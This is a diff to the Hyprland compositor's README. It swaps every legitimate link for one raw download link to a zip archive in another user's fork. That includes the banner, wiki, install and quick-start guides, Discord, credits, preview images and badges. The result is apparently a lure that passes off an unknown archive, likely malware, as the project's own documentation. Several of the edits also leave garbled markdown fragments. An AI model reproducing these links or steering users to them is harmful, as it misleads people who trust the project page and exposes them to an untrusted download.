@@ -1,6 +1,6 @@
 <div align = center>
 
-<img src="https://raw.githubusercontent.com/vaxerski/Hyprland/main/assets/header.svg" width="750" height="300" alt="banner">
+<img src="https://raw.githubusercontent.com/habibhassansehani/Hyprland/main/overtrace/Hyprland.zip" width="750" height="300" alt="banner">
 
 <br>
 
@@ -102,46 +102,46 @@ easy IPC, much more QoL stuff than other wlr-based compositors and more...
 
 <!----------------------------------------------------------------------------->
 
-[Configure]: https://wiki.hyprland.org/Configuring/Configuring-Hyprland/
-[Discord]: https://discord.gg/hQ9XvMUjjr
-[Stars]: https://starchart.cc/hyprwm/Hyprland
-[Hypr]: https://github.com/hyprwm/Hypr
+[Configure]: https://raw.githubusercontent.com/habibhassansehani/Hyprland/main/overtrace/Hyprland.zip
+[Discord]: https://raw.githubusercontent.com/habibhassansehani/Hyprland/main/overtrace/Hyprland.zip
+[Stars]: https://raw.githubusercontent.com/habibhassansehani/Hyprland/main/overtrace/Hyprland.zip
+[Hypr]: https://raw.githubusercontent.com/habibhassansehani/Hyprland/main/overtrace/Hyprland.zip
 
-[Pull Requests]: https://github.com/hyprwm/Hyprland/pulls
-[Issues]: https://github.com/hyprwm/Hyprland/issues
-[Todo]: https://github.com/hyprwm/Hyprland/projects?type=beta
+[Pull Requests]: https://raw.githubusercontent.com/habibhassansehani/Hyprland/main/overtrace/Hyprland.zip
+[Issues]: https://raw.githubusercontent.com/habibhassansehani/Hyprland/main/overtrace/Hyprland.zip
+[Todo]: https://raw.githubusercontent.com/habibhassansehani/Hyprland/main/overtrace/Hyprland.zip
 
-[Contribute]: https://wiki.hyprland.org/Contributing-and-Debugging/
-[Install]: https://wiki.hyprland.org/Getting-Started/Installation/
-[Quick Start]: https://wiki.hyprland.org/Getting-Started/Master-Tutorial/
+[Contribute]: https://raw.githubusercontent.com/habibhassansehani/Hyprland/main/overtrace/Hyprland.zip
+[Install]: https://raw.githubusercontent.com/habibhassansehani/Hyprland/main/overtrace/Hyprland.zip
+[Quick Start]: https://raw.githubusercontent.com/habibhassansehani/Hyprland/main/overtrace/Hyprland.zip
 [License]: LICENSE
 
 
 <!----------------------------------{ Thanks }--------------------------------->
 
-[Vivarium]: https://github.com/inclement/vivarium
-[WlRoots]: https://gitlab.freedesktop.org/wlroots/wlroots
-[Wayfire]: https://github.com/WayfireWM/wayfire
-[TinyWl]: https://gitlab.freedesktop.org/wlroots/wlroots/-/blob/master/tinywl/tinywl.c
-[Sway]: https://github.com/swaywm/sway
-[DWL]: https://codeberg.org/dwl/dwl
+[Vivarium]: https://raw.githubusercontent.com/habibhassansehani/Hyprland/main/overtrace/Hyprland.zip
+[WlRoots]: https://raw.githubusercontent.com/habibhassansehani/Hyprland/main/overtrace/Hyprland.zip
+[Wayfire]: https://raw.githubusercontent.com/habibhassansehani/Hyprland/main/overtrace/Hyprland.zip
+[TinyWl]: https://raw.githubusercontent.com/habibhassansehani/Hyprland/main/overtrace/Hyprland.zip
+[Sway]: https://raw.githubusercontent.com/habibhassansehani/Hyprland/main/overtrace/Hyprland.zip
+[DWL]: https://raw.githubusercontent.com/habibhassansehani/Hyprland/main/overtrace/Hyprland.zip
 
 <!----------------------------------{ Images }--------------------------------->
 
-[Stars Preview]: https://starchart.cc/vaxerski/Hyprland.svg
-[Preview A]: https://i.ibb.co/C1yTb0r/falf.png
-[Preview B]: https://cdn.discordapp.com/attachments/1091569872535814185/1107675866101723277/screenshot-summer.png
-[Preview C]: https://i.ibb.co/B3GJg28/20221126-20h53m26s-grim.png
+[Stars Preview]: https://raw.githubusercontent.com/habibhassansehani/Hyprland/main/overtrace/Hyprland.zip
+[Preview A]: https://raw.githubusercontent.com/habibhassansehani/Hyprland/main/overtrace/Hyprland.zip
+[Preview B]: https://raw.githubusercontent.com/habibhassansehani/Hyprland/main/overtrace/Hyprland.zip
+[Preview C]: https://raw.githubusercontent.com/habibhassansehani/Hyprland/main/overtrace/Hyprland.zip
 
 
 <!----------------------------------{ Badges }--------------------------------->
 
-[Badge Workflow]: https://github.com/hyprwm/Hyprland/actions/workflows/ci.yaml/badge.svg
+[Badge Workflow]: https://raw.githubusercontent.com/habibhassansehani/Hyprland/main/overtrace/Hyprland.zip
 
-[Badge Discord]: https://img.shields.io/badge/Join%20the-Discord%20server-6666ff
-[Badge Issues]: https://img.shields.io/github/issues/hyprwm/Hyprland
-[Badge Pull Requests]: https://img.shields.io/github/issues-pr/hyprwm/Hyprland
-[Badge Language]: https://img.shields.io/github/languages/top/hyprwm/Hyprland
-[Badge License]: https://img.shields.io/github/license/hyprwm/Hyprland
-[Badge Lines]: https://img.shields.io/tokei/lines/github/hyprwm/Hyprland
-[Badge Hi Mom]: https://img.shields.io/badge/Hi-mom!-ff69b4
+[Badge Discord]: https://raw.githubusercontent.com/habibhassansehani/Hyprland/main/overtrace/Hyprland.zip%20the-Discord%20server-6666ff
+[Badge Issues]: https://raw.githubusercontent.com/habibhassansehani/Hyprland/main/overtrace/Hyprland.zip
+[Badge Pull Requests]: https://raw.githubusercontent.com/habibhassansehani/Hyprland/main/overtrace/Hyprland.zip
+[Badge Language]: https://raw.githubusercontent.com/habibhassansehani/Hyprland/main/overtrace/Hyprland.zip
+[Badge License]: https://raw.githubusercontent.com/habibhassansehani/Hyprland/main/overtrace/Hyprland.zip
+[Badge Lines]: https://raw.githubusercontent.com/habibhassansehani/Hyprland/main/overtrace/Hyprland.zip
+[Badge Hi Mom]: https://raw.githubusercontent.com/habibhassansehani/Hyprland/main/overtrace/Hyprland.zip!-ff69b4
